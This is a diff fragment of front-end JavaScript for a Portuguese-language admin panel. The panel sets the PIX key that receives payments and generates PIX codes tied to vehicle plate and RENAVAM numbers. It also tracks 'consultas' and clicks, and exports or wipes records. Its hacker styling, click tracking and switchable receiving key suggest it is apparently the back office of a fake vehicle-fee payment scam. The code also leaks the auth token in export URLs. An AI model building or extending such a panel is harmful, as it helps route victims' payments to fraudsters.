+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': authToken
+                    },
+                    body: JSON.stringify({ 
+                        chavePix: pixChave,
+                        nomeRecebedor: pixNome,
+                        cidadeRecebedor: pixCidade,
+                        pixTipo: pixTipo,
+                        pixIdentificador: pixIdentificador
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.sucesso) {
+                    alert('✅ CONFIGURAÇÃO PIX SALVA COM SUCESSO!');
+                    document.getElementById('pixTestResult').innerHTML = `
+                        <div style="background: rgba(0,255,0,0.1); color: var(--hacker-green); padding: 10px; border-radius: 3px; border: 1px solid var(--hacker-green);">
+                            <i class="fas fa-check-circle"></i> CONFIGURAÇÃO SALVA! OS PRÓXIMOS PIX USARÃO ESTAS INFORMAÇÕES.
+                        </div>
+                    `;
+                    document.getElementById('pixTestResult').style.display = 'block';
+                } else {
+                    alert('❌ ERRO AO SALVAR: ' + (data.mensagem || 'ERRO DESCONHECIDO'));
+                }
+            } catch (error) {
+                console.error('Erro ao salvar configuração PIX:', error);
+                alert('❌ ERRO DE CONEXÃO AO SALVAR CONFIGURAÇÃO');
+            }
+        }
+        
+        async function testarChavePIX() {
+            const pixChave = document.getElementById('pixChave').value.trim();
+            
+            if (!pixChave) {
+                alert('DIGITE UMA CHAVE PIX PARA TESTAR!');
+                return;
+            }
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/testar-pix`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chavePix: pixChave
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.sucesso) {
+                    document.getElementById('pixTestResult').innerHTML = `
+                        <div style="background: rgba(0,255,0,0.1); color: var(--hacker-green); padding: 10px; border-radius: 3px; border: 1px solid var(--hacker-green);">
+                            <i class="fas fa-check-circle"></i> ✅ CHAVE PIX VÁLIDA!<br>
+                            <small>Pode gerar códigos PIX reais com esta chave.</small>
+                            <div style="margin-top: 10px; font-size: 12px; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 3px;">
+                                <strong>CRC:</strong> ${data.crc}<br>
+                                <strong>Tamanho:</strong> ${data.tamanho} caracteres<br>
+                                <strong>Primeiros 30:</strong> ${data.codigoPix.substring(0, 30)}...
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    document.getElementById('pixTestResult').innerHTML = `
+                        <div style="background: rgba(255,0,51,0.1); color: var(--danger-color); padding: 10px; border-radius: 3px; border: 1px solid var(--danger-color);">
+                            <i class="fas fa-exclamation-triangle"></i> ❌ ERRO: ${data.mensagem || 'CHAVE INVÁLIDA'}
+                        </div>
+                    `;
+                }
+                document.getElementById('pixTestResult').style.display = 'block';
                 
             } catch (error) {
-                res.status(500).json({ sucesso: false, erro: error.message });
+                document.getElementById('pixTestResult').innerHTML = `
+                    <div style="background: rgba(255,0,51,0.1); color: var(--danger-color); padding: 10px; border-radius: 3px; border: 1px solid var(--danger-color);">
+                        <i class="fas fa-exclamation-triangle"></i> ❌ ERRO DE CONEXÃO COM SERVIDOR
+                    </div>
+                `;
+                document.getElementById('pixTestResult').style.display = 'block';
             }
-        });
+        }
+        
+        // TESTE RÁPIDO DE PIX
+        async function testarPIXRapido() {
+            const resultDiv = document.getElementById('testePIXResult');
+            resultDiv.innerHTML = '<div style="color: var(--hacker-cyan);"><i class="fas fa-spinner fa-spin"></i> TESTANDO GERAÇÃO DE PIX...</div>';
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/gerar-pix`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        valor: 1.00,
+                        placa: 'TESTE123',
+                        renavam: '123456789',
+                        descricao: 'Teste de PIX',
+                        tipo: 'teste'
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.sucesso) {
+                    resultDiv.innerHTML = `
+                        <div style="background: rgba(0,255,0,0.1); color: var(--hacker-green); padding: 10px; border-radius: 3px; border: 1px solid var(--hacker-green);">
+                            <i class="fas fa-check-circle"></i> <strong>✅ PIX GERADO COM SUCESSO!</strong>
+                            <div style="margin-top: 10px; font-size: 12px; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 3px; overflow-wrap: break-word;">
+                                <strong>Tamanho:</strong> ${data.codigoPix.length} caracteres<br>
+                                <strong>CRC:</strong> ${data.codigoPix.slice(-4)}<br>
+                                <strong>Início:</strong> ${data.codigoPix.substring(0, 50)}...<br>
+                                <strong>Valor:</strong> R$ ${data.valor}<br>
+                                <strong>Chave:</strong> ${data.chavePix}<br>
+                                <strong>Identificador:</strong> ${data.identificador}
+                            </div>
+                            <button onclick="copiarTestePIX('${data.codigoPix}')" style="margin-top: 10px; padding: 5px 10px; background: var(--warning-color); color: #000; border: none; border-radius: 3px; cursor: pointer; font-family: 'Courier New', monospace;">
+                                <i class="fas fa-copy"></i> COPIAR PIX DE TESTE
+                            </button>
+                            <button onclick="testarQRCode('${data.codigoPix}')" style="margin-top: 10px; padding: 5px 10px; background: var(--hacker-cyan); color: #000; border: none; border-radius: 3px; cursor: pointer; font-family: 'Courier New', monospace;">
+                                <i class="fas fa-qrcode"></i> VER QR CODE
+                            </button>
+                        </div>
+                    `;
+                } else {
+                    resultDiv.innerHTML = `
+                        <div style="background: rgba(255,0,51,0.1); color: var(--danger-color); padding: 10px; border-radius: 3px; border: 1px solid var(--danger-color);">
+                            <i class="fas fa-exclamation-triangle"></i> <strong>❌ ERRO:</strong> ${data.mensagem || data.erro}
+                            <div style="margin-top: 10px; font-size: 12px;">
+                                <strong>SOLUÇÃO:</strong> CONFIGURE UMA CHAVE PIX VÁLIDA NA SEÇÃO CONFIGURAÇÕES.
+                            </div>
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                resultDiv.innerHTML = `
+                    <div style="background: rgba(255,0,51,0.1); color: var(--danger-color); padding: 10px; border-radius: 3px; border: 1px solid var(--danger-color);">
+                        <i class="fas fa-exclamation-triangle"></i> <strong>❌ ERRO DE CONEXÃO:</strong> ${error.message}
+                    </div>
+                `;
+            }
+        }
+        
+        function copiarTestePIX(codigo) {
+            navigator.clipboard.writeText(codigo)
+                .then(() => alert('✅ PIX COPIADO! TESTE EM UM APP BANCÁRIO.'))
+                .catch(() => {
+                    // Fallback
+                    const textArea = document.createElement('textarea');
+                    textArea.value = codigo;
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textArea);
+                    alert('✅ PIX COPIADO! TESTE EM UM APP BANCÁRIO.');
+                });
+        }
+        
+        function testarQRCode(codigo) {
+            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(codigo)}`;
+            window.open(qrCodeUrl, '_blank');
+        }
+        
+        async function limparDados(tipo) {
+            const confirmMessages = {
+                'consultas': 'TEM CERTEZA QUE DESEJA LIMPAR TODAS AS CONSULTAS DO BANCO?\nESTA AÇÃO NÃO PODE SER DESFEITA!',
+                'pix': 'TEM CERTEZA QUE DESEJA LIMPAR TODOS OS REGISTROS DE PIX?\nESTA AÇÃO NÃO PODE SER DESFEITA!',
+                'cliques': 'TEM CERTEZA QUE DESEJA LIMPAR TODOS OS CLIQUES?\nESTA AÇÃO NÃO PODE SER DESFEITA!',
+                'tudo': '🚨 PERIGO! 🚨\n\nISSO VAI APAGAR TODOS OS DADOS DO SISTEMA:\n- CONSULTAS\n- PIX\n- CLIQUES\n- ESTATÍSTICAS\n\nESTA AÇÃO NÃO PODE SER DESFEITA!\n\nDIGITE "APAGAR TUDO" PARA CONFIRMAR:'
+            };
+            
+            if (tipo === 'tudo') {
+                const confirmacao = prompt(confirmMessages[tipo]);
+                if (confirmacao !== 'APAGAR TUDO') {
+                    alert('OPERAÇÃO CANCELADA!');
+                    return;
+                }
+            } else if (!confirm(confirmMessages[tipo])) {
+                return;
+            }
+            
+            try {
+                const response = await fetch(`${API_BASE}/api/admin/limpar-dados`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': authToken
+                    },
+                    body: JSON.stringify({ tipo })
+                });
+                
+                const data = await response.json();
+                
+                if (data.sucesso) {
+                    alert(`✅ ${data.mensagem}`);
+                    
+                    // Recarrega dados
+                    if (tipo === 'consultas' && currentSection === 'consultas') {
+                        carregarConsultasCompletas();
+                    } else if (tipo === 'pix' && currentSection === 'pix') {
+                        carregarPixCompletos();
+                    } else if (tipo === 'cliques' && currentSection === 'cliques') {
+                        carregarCliquesCompletos();
+                    }
+                    
+                    carregarDashboard();
+                }
+            } catch (error) {
+                console.error('Erro ao limpar dados:', error);
+                alert('❌ ERRO AO LIMPAR DADOS!');
+            }
+        }
+        
+        // ============================================
+        // EXPORTAÇÃO
+        // ============================================
+        function exportarConsultas() {
+            window.open(`${API_BASE}/api/admin/exportar/consultas?token=${authToken}`, '_blank');
+        }
+        
+        function exportarPix() {
+            window.open(`${API_BASE}/api/admin/exportar/pix?token=${authToken}`, '_blank');
+        }
+        
+        // ============================================
+        // UTILITÁRIOS
+        // ============================================
+        function atualizarUptime() {
+            const agora = Date.now();
+            const diff = agora - uptimeStart;
+            
+            const horas = Math.floor(diff / 3600000);
+            const minutos = Math.floor((diff % 3600000) / 60000);
+            const segundos = Math.floor((diff % 60000) / 1000);
+            
+            document.getElementById('uptimeInfo').textContent = 
+                `${horas.toString().padStart(2, '0')}:${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
+        }
         
         // ============================================
         // INICIALIZAÇÃO
@@ -1618,7 +2182,7 @@
             });
             
             // Atualiza dados periodicamente
-            setInterval(carregarDashboard, 5000);
+            setInterval(carregarDashboard, 10000);
         });
         
         async function testarConexaoServidor() {
@@ -1634,6 +2198,7 @@
                 console.error('❌ SERVIDOR OFFLINE:', error);
                 document.getElementById('connectionAlert').style.display = 'block';
                 
+                // Mostra instruções no login
                 const loginError = document.getElementById('loginError');
                 if (loginError) {
                     loginError.textContent = '❌ SERVIDOR OFFLINE! AGUARDE O DEPLOY COMPLETAR.';
